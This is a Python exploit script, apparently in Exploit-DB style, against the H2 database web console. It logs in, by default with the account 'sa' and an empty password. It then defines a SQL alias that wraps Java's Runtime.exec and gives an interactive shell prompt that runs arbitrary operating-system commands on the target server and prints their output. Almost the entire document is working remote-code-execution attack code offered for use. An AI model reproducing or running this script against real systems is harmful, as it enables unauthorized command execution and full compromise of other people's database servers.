'''
Exploit Title: H2 Database Alias Abuse
Date: 05/04/2018
Exploit Author: gambler
Vendor Homepage:www.h2database.com
Software Link: http://www.h2database.com/html/download.html
Version: all versions
Tested on: Linux, Mac OS
'''

import sys
import argparse
import html
import requests

# Blogpost about it
# https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html

def getCookie(host):
    url = 'http://{}'.format(host)
    r = requests.get(url)
    path = r.text.split('href = ')[1].split(';')[0].replace("'","").replace('.jsp','.do')
    return '{}/{}'.format(url,path)

def login(url,user,passwd,database):
    data = {'language':'en','setting':'Generic+H2+(Embedded)','name':'Generic+H2+(Embedded)','driver':'org.h2.Driver','url':database,'user':user,'password':passwd}
    r = requests.post(url,data=data)
    if '<th class="login">Login</th>' in r.text:
        return False
    return True

def prepare(url):
    cmd = '''CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : "";  }$$;'''
    url = url.replace('login','query')
    r = requests.post(url,data={'sql':cmd})
    if not 'Syntax error' in r.text:
        return url
    return False

def execve(url,cmd):
    r = requests.post(url,data={'sql':"CALL EXECVE('{}')".format(cmd)})
    try:
        print(html.unescape(r.text.split('</th></tr><tr><td>')[1].split('</td>')[0].replace('<br />','\n').replace('&nbsp;',' ')).encode('utf-8').decode('utf-8','ignore'))
    except Exception as e:
        print('Something goes wrong')
        print(e)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    required = parser.add_argument_group('required arguments')
    required.add_argument("-H",
            "--host",
            metavar='127.0.0.1:4336',
            help="Specify a host",
            required=True)
    required.add_argument("-d",
            "--database-url",
            metavar='jdbc:h2~/test',
            default="jdbc:h2~/test",
            help="Database URL",
            required=False)
    required.add_argument("-u",
            "--user",
            metavar='username',
            default="sa",
            help="Username to log on H2 Database, default sa",
            required=False)
    required.add_argument("-p",
            "--password",
            metavar='password',
            default="",
            help="Password to log on H2 Database, default None",
            required=False)
    args = parser.parse_args()

url = getCookie(args.host)
if login(url,args.user,args.password,args.database_url):
    url = prepare(url)
    if url:
        while 1:
            try:
                cmd = input('cmdline@ ')
                execve(url,cmd)
            except KeyboardInterrupt:
                print("\nProfessores ensinam, nadadores Nadam e Hackers Hackeiam")
                sys.exit(0)
    else:
        print('ERROR - Inserting Payload')
        print("Something goes wrong, exiting...")
else:
    print("ERROR - Auth")
    print("Something goes wrong, exiting...")